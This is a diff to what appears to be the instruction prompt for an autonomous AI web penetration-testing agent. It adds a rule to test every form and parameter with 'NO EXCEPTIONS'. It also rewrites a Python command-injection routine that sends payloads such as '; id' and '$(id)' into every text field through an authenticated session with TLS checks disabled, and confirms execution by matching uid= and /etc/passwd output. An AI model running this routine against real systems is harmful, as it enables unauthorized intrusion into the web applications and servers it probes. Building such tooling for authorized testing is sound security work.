@@ -1052,8 +1052,27 @@ After compaction, read plan.md to see exactly where you left off.
         print(f"  [{f['method'].upper()}] {f['action']}  {csrf}  fields={[x['name'] for x in f['fields']]}")
     ```
 
-  USE these AUTH_FORMS in ALL subsequent phases (XSS, SQLi, CSRF, IDOR).
+  USE these AUTH_FORMS in ALL subsequent phases (XSS, SQLi, CSRF, IDOR, CMDi, SSTI).
   Do NOT only test the login form — test EVERY form you discovered in this crawl.
+
+  ═══════════════════════════════════════════════════════
+  RULE: TEST ALL PAGES, ALL FORMS, ALL PARAMETERS — NO EXCEPTIONS
+  ═══════════════════════════════════════════════════════
+  After the authenticated crawl, you have AUTH_PAGES, AUTH_FORMS, and AUTH_PARAMS.
+  In EVERY subsequent testing phase, you MUST:
+    1. Iterate through ALL forms in AUTH_FORMS + ALL_FORMS
+    2. Test EVERY text input field in each form (not just fields with "obvious" names)
+    3. Also test URL parameters found in AUTH_PARAMS
+    4. Visit EVERY page in AUTH_PAGES and look for features to test
+    5. NEVER skip a form because "it doesn't look injectable" — test it anyway
+
+  The crawl discovered these pages/forms for a reason. A form on /tools with a "target"
+  field is a command injection candidate. A form on /notes with a "content" field is a
+  stored XSS candidate. A form on /profile with an "avatar" URL field is an SSRF candidate.
+  A search form with a "q" field is an SSTI candidate. TEST THEM ALL.
+
+  If a phase says "test all forms" but you only tested 2 out of 15, YOU DID IT WRONG.
+  Go back and test the remaining forms before moving to the next phase.
 
   ═══════════════════════════════════════════════════════
   OBJECT ID HARVESTING (run immediately after authenticated crawl)
@@ -2551,27 +2570,30 @@ if not _pp_found:
           print('  Note: verify manually — some rate limiting only activates after 50+ requests')
   ```
 
-  **Command Injection — Discover & Test Network-Tool Endpoints:**
-  ```python
-  import re as _re
+  **Command Injection — Test ALL Forms + Discover Network-Tool Endpoints:**
 
-  # ── Use authenticated session — /tools and similar endpoints require login ──────
-  # Prefer session_a (authenticated), fall back to whatever session exists
+  IMPORTANT: Command injection can be in ANY form field, not just params named "host" or "target".
+  Test ALL text inputs on ALL crawled forms, plus probe common network-tool paths.
+  Use the AUTHENTICATED session — many CMDi endpoints require login (e.g. /tools).
+
+  ```python
+  import time, re as _re
+  from urllib.parse import urljoin
+
+  BASE    = _G['BASE']
+  # MUST use authenticated session — network tool pages often require login
   cmdi_session = _G.get('session_a') or _G.get('session')
   if cmdi_session is None:
       import requests as _req
       cmdi_session = _req.Session()
       cmdi_session.verify = False
       cmdi_session.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-  print(f'[CMDi] Using session: {"authenticated" if _G.get("session_a") else "unauthenticated"}')
+  print(f'[CMDi] Using session: {"authenticated" if _G.get("session_a") or _G.get("session") else "unauthenticated"}')
 
-  # ── Step 1: Build candidate list from spider + direct probes ──────────────────
-  # Keywords that suggest a "network tool" or "command execution" endpoint
   _CMDI_KEYWORDS = ['ping', 'lookup', 'nslookup', 'traceroute', 'whois', 'dig',
                     'exec', 'execute', 'run', 'cmd', 'command', 'tool', 'network',
-                    'test', 'check', 'scan', 'query', 'resolve']
+                    'check', 'scan', 'resolve', 'diag', 'util']
 
-  # Common direct-probe paths for CMDi-prone features
   _CMDI_PATHS = [
       '/ping', '/tools', '/tools/ping', '/network', '/network/ping',
       '/network/lookup', '/lookup', '/nslookup', '/traceroute', '/whois',
@@ -2580,139 +2602,165 @@ if not _pp_found:
       '/util', '/utils', '/diagnostics', '/debug', '/test',
   ]
 
-  # Gather candidates from spider results
-  spider_urls = _G.get('SPIDER', {})
-  if isinstance(spider_urls, dict):
-      spider_urls = list(spider_urls.keys())
-
-  cmdi_candidates = set()
-  for url in spider_urls:
-      path = url.replace(BASE, '').split('?')[0].lower()
-      if any(kw in path for kw in _CMDI_KEYWORDS):
-          cmdi_candidates.add(url.split('?')[0])
-
-  # Add direct probe paths
-  for p in _CMDI_PATHS:
-      cmdi_candidates.add(BASE.rstrip('/') + p)
-
-  print(f'[CMDi] {len(cmdi_candidates)} candidate endpoints to probe')
-
-  # ── Step 2: Detect live endpoints and find injectable params ─────────────────
-  # Injection payloads — each should produce 'uid=' in output if executed
   _CMDI_PAYLOADS = [
+      '127.0.0.1; id',
+      '127.0.0.1 | id',
+      '127.0.0.1 && id',
       '; id',
       '| id',
       '`id`',
       '$(id)',
       '& id',
       '|| id',
-      '\nid\n',
       ';id;',
-      '127.0.0.1; id',
-      '127.0.0.1 | id',
-      '127.0.0.1 && id',
   ]
 
-  # Common POST body param names for network tools
-  _TARGET_PARAMS = ['target', 'host', 'ip', 'addr', 'address', 'domain',
-                    'query', 'url', 'input', 'cmd', 'command', 'q', 'name']
+  # ── Step 1: Collect ALL forms from crawl that might be CMDi targets ──────────
+  # Source A: Forms from authenticated crawl (AUTH_FORMS)
+  # Source B: Forms from unauthenticated spider (ALL_FORMS)
+  # Source C: Direct probing of common CMDi paths
+  AUTH_FORMS = _G.get('AUTH_FORMS', [])
+  ALL_FORMS  = _G.get('ALL_FORMS', [])
+  AUTH_PAGES = _G.get('AUTH_PAGES', {})
+  ALL_PAGES  = _G.get('ALL_PAGES', {})
 
-  cmdi_findings = []
+  # Collect forms from crawl that have CMDi-related keywords in URL or field names
+  cmdi_forms = []  # list of (url, method, field_names, extra_data)
 
-  for endpoint in sorted(cmdi_candidates):
+  for form in AUTH_FORMS + ALL_FORMS:
+      action = form.get('action', BASE)
+      url = action if action.startswith('http') else urljoin(BASE, action)
+      method = form.get('method', 'get').lower()
+      path_lower = url.replace(BASE, '').lower()
+      fields = form.get('fields', [])
+
+      # Check if URL path or any field name suggests CMDi
+      is_cmdi_candidate = any(kw in path_lower for kw in _CMDI_KEYWORDS)
+      field_names = []
+      extra_data = {}
+      for f in fields:
+          fname = f.get('name', '')
+          ftype = f.get('type', 'text').lower()
+          if not fname or ftype in ('submit', 'button'):
+              continue
+          if ftype == 'hidden':
+              extra_data[fname] = f.get('value', '')
+          elif ftype in ('checkbox', 'radio', 'file'):
+              extra_data[fname] = f.get('value', '')
+          else:
+              field_names.append(fname)
+              # Also flag if field name suggests CMDi target
+              if any(kw in fname.lower() for kw in ['target', 'host', 'ip', 'addr',
+                     'domain', 'cmd', 'command', 'input', 'query', 'server', 'ping']):
+                  is_cmdi_candidate = True
+
+      if is_cmdi_candidate and field_names:
+          cmdi_forms.append((url, method, field_names, extra_data))
+
+  # ── Step 2: Probe common CMDi paths not in crawl ─────────────────────────────
+  crawled_urls = set(list(AUTH_PAGES.keys()) + list(ALL_PAGES.keys()))
+  from bs4 import BeautifulSoup as _BS4
+
+  for p in _CMDI_PATHS:
+      endpoint = BASE.rstrip('/') + p
+      if endpoint in crawled_urls:
+          continue  # already in crawl, forms already collected above
       time.sleep(0.2)
-      # First: probe GET to see if it's alive and get any form
       try:
           probe = cmdi_session.get(endpoint, timeout=8, verify=False)
       except Exception:
           continue
       if probe.status_code in (404, 410):
           continue
-      # Skip if we got redirected to login (endpoint requires auth we don't have)
-      if 'login' in probe.url and probe.url != endpoint:
-          print(f'[CMDi] {endpoint} → redirected to login (auth required, skipping)')
+      if 'login' in probe.url and 'login' not in endpoint:
+          print(f'[CMDi] {endpoint} → needs auth (redirected to login)')
           continue
-      print(f'[CMDi] Live: {endpoint} ({probe.status_code})')
+      print(f'[CMDi] Probed: {endpoint} ({probe.status_code})')
 
-      # Parse any <form> to find real param names + method
-      from bs4 import BeautifulSoup as _BS4
       soup = _BS4(probe.text, 'html.parser')
-      forms = soup.find_all('form')
-      endpoints_to_test = []  # (method, url, param_names, extra_fields)
-
-      for form in forms:
+      for form in soup.find_all('form'):
           action = form.get('action', '')
-          method = (form.get('method', 'get')).lower()
-          form_url = action if action.startswith('http') else (BASE.rstrip('/') + '/' + action.lstrip('/') if action else endpoint)
-          inputs = form.find_all(['input', 'select', 'textarea'])
+          method = form.get('method', 'get').lower()
+          form_url = action if action.startswith('http') else urljoin(endpoint, action or p)
           field_names = []
           extra_data = {}
-          for inp in inputs:
+          for inp in form.find_all(['input', 'select', 'textarea']):
               n = inp.get('name', '')
               if not n:
                   continue
               tag = inp.name.lower()
               itype = inp.get('type', 'text').lower()
-              if itype == 'submit' or inp.get('type') == 'button':
-                  continue  # skip submit buttons
+              if itype in ('submit', 'button'):
+                  continue
               elif itype == 'hidden':
                   extra_data[n] = inp.get('value', '')
               elif tag == 'select':
-                  # Get first <option> value — treat as fixed field (not injection target)
                   first_opt = inp.find('option')
                   extra_data[n] = first_opt.get('value', '') if first_opt else ''
               else:
                   field_names.append(n)
           if field_names:
-              endpoints_to_test.append((method, form_url, field_names, extra_data))
+              cmdi_forms.append((form_url, method, field_names, extra_data))
 
-      # Fallback: no form found — try GET params from _TARGET_PARAMS
-      if not endpoints_to_test:
-          endpoints_to_test.append(('get', endpoint, _TARGET_PARAMS, {}))
+      # No form found — try GET params
+      if not soup.find_all('form'):
+          cmdi_forms.append(('get', endpoint,
+              ['target', 'host', 'ip', 'addr', 'cmd', 'command', 'q', 'input'], {}))
 
-      # ── Step 3: Inject into each param ────────────────────────────────────────
-      for (method, test_url, field_names, extra_data) in endpoints_to_test:
-          for param in field_names:
-              param_lower = param.lower()
-              # Only test params that likely receive a host/target/command value
-              if not any(kw in param_lower for kw in _TARGET_PARAMS):
+  # Dedup
+  seen = set()
+  unique_forms = []
+  for entry in cmdi_forms:
+      key = (entry[0], tuple(entry[2]))
+      if key not in seen:
+          seen.add(key)
+          unique_forms.append(entry)
+  cmdi_forms = unique_forms
+
+  print(f'[CMDi] {len(cmdi_forms)} forms/endpoints to test')
+
+  # ── Step 3: Inject into EVERY text field on candidate forms ──────────────────
+  cmdi_findings = []
+
+  for (test_url, method, field_names, extra_data) in cmdi_forms:
+      print(f'  Testing: {method.upper()} {test_url}  fields={field_names}')
+      for param in field_names:
+          for payload in _CMDI_PAYLOADS:
+              time.sleep(0.3)
+              data = dict(extra_data)
+              data[param] = payload
+              try:
+                  if method == 'post':
+                      r = cmdi_session.post(test_url, data=data, timeout=10, verify=False)
+                  else:
+                      r = cmdi_session.get(test_url, params=data, timeout=10, verify=False)
+              except Exception as e:
+                  print(f'  [ERROR] {param}={repr(payload)}: {e}')
                   continue
-              for payload in _CMDI_PAYLOADS:
-                  time.sleep(0.3)
-                  data = dict(extra_data)
-                  data[param] = payload
-                  try:
-                      if method == 'post':
-                          r = cmdi_session.post(test_url, data=data, timeout=10, verify=False)
-                      else:
-                          r = cmdi_session.get(test_url, params=data, timeout=10, verify=False)
-                  except Exception as e:
-                      print(f'  [ERROR] {param}={repr(payload)}: {e}')
-                      continue
 
-                  body = r.text
-                  # Check for command execution evidence
-                  cmdi_hit = False
-                  if _re.search(r'uid=\d+\([a-z_]+\)', body):
-                      print(f'[CRITICAL] CMDi CONFIRMED at {test_url}')
-                      print(f'  Param: {param!r}  Payload: {payload!r}')
-                      print(f'  Evidence: {_re.search(r"uid=.{{0,30}}", body).group()}')
-                      cmdi_hit = True
-                  elif _re.search(r'(root|www-data|apache|nginx|nobody):.*:/bin/', body):
-                      print(f'[CRITICAL] CMDi CONFIRMED (passwd echo) at {test_url}')
-                      cmdi_hit = True
-                  elif 'PING' in body and '64 bytes' in body and '127.0.0.1' not in payload:
-                      # Blind ping — check timing differential for blind CMDi
-                      pass
-                  if cmdi_hit:
-                      cmdi_findings.append({
-                          'url': test_url, 'param': param,
-                          'payload': payload, 'method': method.upper(),
-                          'evidence': body[:300],
-                      })
-                      break  # confirmed — move to next param
-              if cmdi_findings and cmdi_findings[-1]['url'] == test_url:
-                  break  # found on this endpoint — no need to keep trying
+              body = r.text
+              cmdi_hit = False
+
+              # Check for command execution evidence
+              if _re.search(r'uid=\d+\([a-z_]+\)', body):
+                  print(f'[CRITICAL] CMDi CONFIRMED at {test_url}')
+                  print(f'  Param: {param!r}  Payload: {payload!r}')
+                  print(f'  Evidence: {_re.search(r"uid=.{{0,30}}", body).group()}')
+                  cmdi_hit = True
+              elif _re.search(r'(root|www-data|apache|nginx|nobody):.*:/bin/', body):
+                  print(f'[CRITICAL] CMDi CONFIRMED (passwd echo) at {test_url}')
+                  print(f'  Param: {param!r}  Payload: {payload!r}')
+                  cmdi_hit = True
+
+              if cmdi_hit:
+                  cmdi_findings.append({
+                      'url': test_url, 'param': param,
+                      'payload': payload, 'method': method.upper(),
+                      'evidence': body[:500],
+                  })
+                  break  # confirmed — move to next param
+          if cmdi_findings and cmdi_findings[-1].get('url') == test_url:
+              break  # found on this endpoint
 
   if cmdi_findings:
       _G['CMDI_FINDINGS'] = cmdi_findings
@@ -2726,8 +2774,8 @@ if not _pp_found:
           })
       print(f'\n[CRITICAL] Command Injection found on {len(cmdi_findings)} endpoint(s)!')
   else:
-      print('[INFO] No command injection found on probed endpoints')
-      print('  Checked: ' + ', '.join(sorted(cmdi_candidates))[:200])
+      print('[INFO] No command injection found')
+      print('  Tested: ' + ', '.join(f[0] for f in cmdi_forms)[:300])
   ```
 
   **SSTI (Server-Side Template Injection) — Test ALL Text Inputs:**
